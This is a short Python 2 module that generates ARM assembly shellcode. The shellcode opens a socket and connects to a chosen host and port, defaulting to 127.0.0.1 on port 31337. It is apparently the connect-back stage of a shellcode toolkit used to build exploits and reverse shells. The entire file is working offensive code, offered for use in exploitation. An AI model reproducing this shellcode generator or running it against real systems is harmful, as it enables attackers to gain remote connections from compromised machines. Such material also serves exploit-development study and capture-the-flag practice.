from socket import htons, inet_aton, gethostbyname
from struct import unpack

def binary_ip(host):
    return inet_aton(gethostbyname(host))

def u32(u):
    return unpack("<I", u)[0]

def generate(host='127.0.0.1', port=31337):
    """Connects to remote machine on specific port

    Args:
        host(str): hostname or IP address

        port(int/str): specific port
    """

    sc = """
    mov r0, #2
    mov r1, #1
    sub r2, r2, r2
    /* socket */
    movw r7, #281
    svc 0
    adr r1, sockaddr_1
    mov r2, #16
    mov r6, r0
    b after_sockaddr_2
    sub r1, r1, r1
sockaddr_1:
    .short 0x2
    .short %s
    .word  %s
    
after_sockaddr_2:
    /* connect */
    movw r7, #283
    svc 0
    """ % (htons(int(port)), u32(binary_ip(host)))
    return sc

if __name__ == '__main__':
    print generate()
